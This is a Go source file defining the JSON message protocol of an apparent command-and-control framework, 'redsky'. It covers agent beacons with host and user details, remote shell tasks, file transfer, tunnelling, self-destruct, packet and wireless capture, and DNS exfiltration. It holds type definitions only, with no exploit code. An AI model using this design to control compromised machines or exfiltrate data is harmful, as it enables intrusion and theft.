// Package proto defines the on-wire message types between redsky-core and
// redsky-agent. JSON is the default encoding. Every message carries a Type
// field so the receiver can dispatch without a separate envelope.
package proto

import "encoding/json"

// MessageType identifies what a message is.
type MessageType string

const (
	// Core -> agent
	TypeTask        MessageType = "task"
	TypeFilePut     MessageType = "file_put"
	TypeFileGet     MessageType = "file_get"
	TypeTunnelOpen  MessageType = "tunnel_open"
	TypeTunnelClose MessageType = "tunnel_close"
	TypeSleep       MessageType = "sleep"
	TypeKill        MessageType = "kill"
	TypeKeyRotate   MessageType = "key_rotate"

	// Agent -> core
	TypeBeacon     MessageType = "beacon"
	TypeResult     MessageType = "result"
	TypeFileChunk  MessageType = "file_chunk"
	TypeTunnelData MessageType = "tunnel_data"
	TypeError      MessageType = "error"

	// Tunnel control (bidirectional)
	TypeTunnelReady MessageType = "tunnel_ready"
	TypeTunnelFail  MessageType = "tunnel_fail"

	// Packet capture (agent -> core)
	TypeCaptureStart MessageType = "capture_start"
	TypeCaptureStop  MessageType = "capture_stop"
	TypeCaptureData  MessageType = "capture_data"
	TypeCaptureDone  MessageType = "capture_done"
	TypeCaptureFail  MessageType = "capture_fail"

	// DNS exfil (agent -> core, over the wire as DNS queries)
	TypeDNSExfilChunk MessageType = "dns_exfil_chunk"
	TypeDNSExfilDone  MessageType = "dns_exfil_done"

	// Wireless capture (agent -> core)
	TypeWirelessStart MessageType = "wireless_start"
	TypeWirelessStop  MessageType = "wireless_stop"
	TypeWirelessData  MessageType = "wireless_data"
	TypeWirelessDone  MessageType = "wireless_done"
	TypeWirelessFail  MessageType = "wireless_fail"
)

// Envelope wraps every message. Payload is the raw JSON of the concrete type
// named by Type.
type Envelope struct {
	Type    MessageType     `json:"type"`
	Payload json.RawMessage `json:"payload"`
}

// AgentInfo is the host description an agent sends on every beacon.
type AgentInfo struct {
	Hostname     string   `json:"hostname"`
	OS           string   `json:"os"`
	Arch         string   `json:"arch"`
	User         string   `json:"user"`
	UID          int      `json:"uid"`
	PID          int      `json:"pid"`
	Capabilities []string `json:"capabilities"`
}

// Beacon is what the agent sends to check in.
type Beacon struct {
	AgentID string    `json:"agent_id"`
	Info    AgentInfo `json:"info"`
	TS      int64     `json:"ts"`
}

// Task is a command the core wants the agent to run.
//
// Kind distinguishes how the agent should handle it:
//   "shell"     — exec.Command(Cmd, Args...)
//   "framework" — dispatch to an internal Go function named Cmd with Args
type Task struct {
	ID      string   `json:"id"`
	Kind    string   `json:"kind,omitempty"`
	Cmd     string   `json:"cmd"`
	Args    []string `json:"args"`
	Timeout int      `json:"timeout"`
}

// Result is the agent's answer to a Task.
type Result struct {
	TaskID   string `json:"task_id"`
	Stdout   string `json:"stdout"`
	Stderr   string `json:"stderr"`
	ExitCode int    `json:"exit_code"`
	Error    string `json:"error,omitempty"`
}

// Sleep changes the beacon interval.
type Sleep struct {
	MS int `json:"ms"`
}

// Kill tells the agent to self-destruct.
type Kill struct{}

// ErrorReport is a generic error from the agent.
type ErrorReport struct {
	TaskID  string `json:"task_id,omitempty"`
	Message string `json:"message"`
}


// TunnelOpen is sent by core to ask the agent to dial (host:port).
type TunnelOpen struct {
	TunnelID string `json:"tunnel_id"`
	Host     string `json:"host"`
	Port     int    `json:"port"`
}

// TunnelData is one chunk of a tunnel stream. Direction is implied by sender.
// Data is base64-encoded on the wire via JSON []byte marshalling.
type TunnelData struct {
	TunnelID string `json:"tunnel_id"`
	Data     []byte `json:"data"`
	EOF      bool   `json:"eof,omitempty"`
}

// TunnelClose asks both ends to tear down a tunnel.
type TunnelClose struct {
	TunnelID string `json:"tunnel_id"`
	Reason   string `json:"reason,omitempty"`
}

// TunnelReady is the agent's acknowledgement that a tunnel is dialed.
type TunnelReady struct {
	TunnelID string `json:"tunnel_id"`
}

// TunnelFail is the agent's failure report.
type TunnelFail struct {
	TunnelID string `json:"tunnel_id"`
	Error    string `json:"error"`
}


// CaptureStart asks the agent to begin a packet capture on iface.
type CaptureStart struct {
	SessionID string `json:"session_id"`
	Iface     string `json:"iface"`
	Filter    string `json:"filter,omitempty"` // optional BPF, agent-side only supports "any" for now
	Snaplen   int    `json:"snaplen,omitempty"` // 0 = full frames
}

// CaptureStop asks the agent to stop the capture with the given session.
type CaptureStop struct {
	SessionID string `json:"session_id"`
}

// CaptureData is one chunk of captured frames.
type CaptureData struct {
	SessionID string `json:"session_id"`
	Data      []byte `json:"data"` // chunk of pcap-format bytes
	Count     int    `json:"count"` // number of frames in this chunk
}

// CaptureDone signals the capture ended cleanly.
type CaptureDone struct {
	SessionID string `json:"session_id"`
	Total     int    `json:"total"`
	Bytes     int64  `json:"bytes"`
}

// CaptureFail reports an error starting the capture.
type CaptureFail struct {
	SessionID string `json:"session_id"`
	Error     string `json:"error"`
}


// DNSExfilChunk is metadata about one DNS exfil payload. The actual bytes
// travel in DNS query labels; this struct is only used to route the decoded
// payload through the framework's internal message bus.
type DNSExfilChunk struct {
	SessionID string `json:"session_id"`
	Seq       int    `json:"seq"`
	Total     int    `json:"total"`
	Payload   []byte `json:"payload"`
}

// DNSExfilDone signals a DNS exfil session completed.
type DNSExfilDone struct {
	SessionID string `json:"session_id"`
	Bytes     int64  `json:"bytes"`
	Chunks    int    `json:"chunks"`
}


// WirelessStart asks the agent to begin an 802.11 capture.
type WirelessStart struct {
	SessionID string `json:"session_id"`
	Iface     string `json:"iface"`
	Channel   int    `json:"channel,omitempty"`
}

// WirelessStop ends the capture.
type WirelessStop struct {
	SessionID string `json:"session_id"`
}

// WirelessData carries one chunk of pcapng-format 802.11 frames.
type WirelessData struct {
	SessionID string `json:"session_id"`
	Data      []byte `json:"data"`
	Count     int    `json:"count"`
}

// WirelessDone signals a clean end.
type WirelessDone struct {
	SessionID string `json:"session_id"`
	Total     int    `json:"total"`
	Bytes     int64  `json:"bytes"`
}

// WirelessFail reports a capture error.
type WirelessFail struct {
	SessionID string `json:"session_id"`
	Error     string `json:"error"`
}
